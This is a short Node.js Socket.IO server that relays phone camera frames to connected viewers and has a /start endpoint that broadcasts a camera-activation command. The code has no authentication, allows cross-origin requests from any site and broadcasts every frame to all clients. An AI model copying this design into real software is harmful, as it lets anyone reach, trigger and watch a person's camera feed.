// server.js — Socket.IO v4.8.1 (Node.js)

const express = require("express");
const http = require("http");
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);

const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
  },
});

io.on('connection', (socket) => {
  console.log('📱 Phone Connected', socket.id);

  socket.on('camera_frame', (data) => {
    // broadcast frame to viewers
    io.emit('camera_frame', data);
  });

  socket.on('disconnect', () => {
    console.log('📴 Disconnected Phone', socket.id);
  });
})
// שליחת פקודת הפעלת מצלמה
app.get("/start", (req, res) => {
  io.emit("start_camera");
  res.send("📸 Camera Permission Sent!");
});

const PORT = 3000;
server.listen(PORT, "0.0.0.0", () => {
  console.log(`Server Running on  http://localhost:${PORT}`);
});
